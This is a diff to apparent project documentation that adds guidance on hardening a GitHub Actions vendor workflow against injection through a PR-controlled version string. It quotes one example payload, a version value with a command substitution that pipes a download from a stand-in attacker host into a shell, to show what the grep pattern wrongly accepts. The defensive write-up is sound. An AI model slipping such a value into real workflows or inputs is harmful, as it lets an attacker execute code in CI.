@@ -54,6 +54,32 @@ automerges.
 
 **No manual steps are required for routine chunkah upgrades.**
 
+### Hardening the vendor workflow — the version it reads is attacker-controlled
+
+`vendor-chunka-files.yml` holds `contents: write` **and** checks out the PR head, so the
+`CHUNKAH_VERSION` it greps out of `bootc-build/chunka/action.yml` is whatever the PR author wrote.
+Two constraints are load-bearing and must survive any edit:
+
+- **Job `if:` must keep the head-repo check.** `startsWith(github.head_ref, 'renovate/')` is a
+  *branch-name* test, not a trust boundary — any fork can push a branch called `renovate/x` and
+  satisfy it. Pair it with
+  `github.event.pull_request.head.repo.full_name == github.repository`. Renovate branches are
+  always same-repo, so this costs nothing.
+- **Validate the shape before use, and pass it via `env:`.** `grep -oP 'CHUNKAH_VERSION="\K[^"]+'`
+  happily matches `v1.0.0$(curl attacker | sh)` — the character class only excludes `"`. Assert
+  `^v[0-9]+\.[0-9]+\.[0-9]+$` at extraction time and fail the step with `::error::`. Then hand the
+  value to shell as `env: VERSION: ${{ steps.version.outputs.version }}`, never inline in `run:`.
+
+The regex is not just injection defence: the same value is spliced into the release-download URL
+path, so an unvalidated tag can steer which artifact gets vendored and hash-stamped into
+`action.yml`. Note it deliberately excludes pre-release tags — if chunkah ever ships one, the
+workflow fails loudly at extraction instead of vendoring an unreviewed asset.
+
+This is the general `env:` rule from [`composite-actions.md`](composite-actions.md) ("Passing
+inputs to shell") applied to a *workflow* step rather than a composite action: step outputs fed
+from PR-head content are untrusted input, and the `${{ }}` → `env:` move is what closes the
+injection, because it stops the value being expanded before bash ever parses the script.
+
 If the `Containerfile.splitter` changes in a way that requires coordinated changes to `action.yml`
 (e.g. a new output format — this happened between v0.5.0 and v0.6.0 where `oci-archive:out.ociarchive`
 became `oci:out`), the vendor workflow will commit the new file but CI may fail, signalling that
